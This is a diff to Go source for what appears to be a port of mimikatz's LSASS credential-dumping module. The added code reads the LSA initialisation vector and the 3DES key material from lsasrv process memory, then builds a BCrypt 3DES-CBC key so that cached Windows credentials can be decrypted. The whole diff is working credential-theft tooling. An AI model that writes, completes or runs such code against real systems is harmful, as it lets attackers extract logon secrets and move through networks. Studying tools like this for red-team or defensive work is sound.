@@ -70,7 +70,6 @@ func (kiwi *Kiwi) requireNT6LSAKeys(pHandle windows.Handle) error {
 	// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
 
 	address2 := lsasrv.address + uintptr(index) + 67 // TODO off0
-	fmt.Printf("5, %X\n", address2)
 
 	var offset2 uint32
 	_, err = api.ReadProcessMemory(pHandle, address2, (*byte)(unsafe.Pointer(&offset2)), unsafe.Sizeof(offset2))
@@ -79,21 +78,20 @@ func (kiwi *Kiwi) requireNT6LSAKeys(pHandle windows.Handle) error {
 	}
 
 	address2 += 4 + uintptr(offset2)
-	fmt.Printf("6, %X\n", address2)
 
 	iv := make([]byte, 16)
 	_, err = api.ReadProcessMemory(pHandle, address2, &iv[0], uintptr(16))
 	if err != nil {
 		return errors.WithMessage(err, "failed to search iv")
 	}
-	fmt.Println(iv)
+	kiwi.iv = iv
+	fmt.Println("IV:", iv)
 
 	address3 := lsasrv.address + uintptr(index) - 89 // TODO off1
-	fmt.Printf("7, %X\n", address3)
-	kiwi.nt6RequireKey(pHandle, lsasrv.address+uintptr(index)-89)
-	address3 = lsasrv.address + uintptr(index) + 16 // TODO off2
-	fmt.Printf("7, %X\n", address3)
+
 	kiwi.nt6RequireKey(pHandle, address3)
+	// address3 = lsasrv.address + uintptr(index) + 16 // TODO off2
+	// kiwi.nt6RequireKey(pHandle, address3)
 	return nil
 }
 
@@ -138,34 +136,35 @@ func (kiwi *Kiwi) nt6RequireKey(pHandle windows.Handle, address3 uintptr) error 
 	fmt.Println(bhk.size)
 	fmt.Println(bk81.size)
 
+	kiwi.hardKeyData = hardKeyData
+
 	algHandle, err := api.BCryptOpenAlgorithmProvider("3DES", "", 0)
 	if err != nil {
 		return errors.WithMessage(err, "failed to open bcrypt handle key")
 	}
 
-	var phKey uintptr
-
-	buf1 := make([]byte, int(bhk.size+bk81.size))
-
-	// err = api.BCryptGenerateSymmetricKey(algHandle, &phKey, &buf1[0], uint32(len(buf1)), &hardKeyData[0], bk81.hardKey.cbSecret, 0)
-	// if err != nil {
-	// 	return errors.WithMessage(err, "failed to open bcrypt handle key")
-	// }
-	fmt.Println(algHandle)
-
-	fmt.Println(phKey)
-	fmt.Println(buf1)
-
-	// bgk := bcryptGenKey{
-	// 	algProvider: algHandle,
-	// 	key:         phKey,
-	// 	pKey:        buf1,
-	// 	cbKey:       uint32(len(buf1)),
-	// }
-
-	// 558
-
-	// 654
+	prop := "ChainingMode"
+	mode := windows.StringToUTF16("ChainingModeCBC")
+	err = api.BCryptSetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&mode[0])), uint32(len(mode)), 0)
+	if err != nil {
+		return errors.WithMessage(err, "failed to set bcrypt handle key")
+	}
+	prop = "ObjectLength"
+	var length uint32
+	_, err = api.BCryptGetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&length)), 4, 0)
+	if err != nil {
+		return errors.WithMessage(err, "failed to set bcrypt handle key")
+	}
+	bk := api.BcryptKey{
+		Provider: algHandle,
+		Object:   make([]byte, length),
+		Secret:   hardKeyData,
+	}
+	err = api.BCryptGenerateSymmetricKey(&bk)
+	if err != nil {
+		return err
+	}
+	kiwi.key3DES = &bk
 
 	return nil
 }
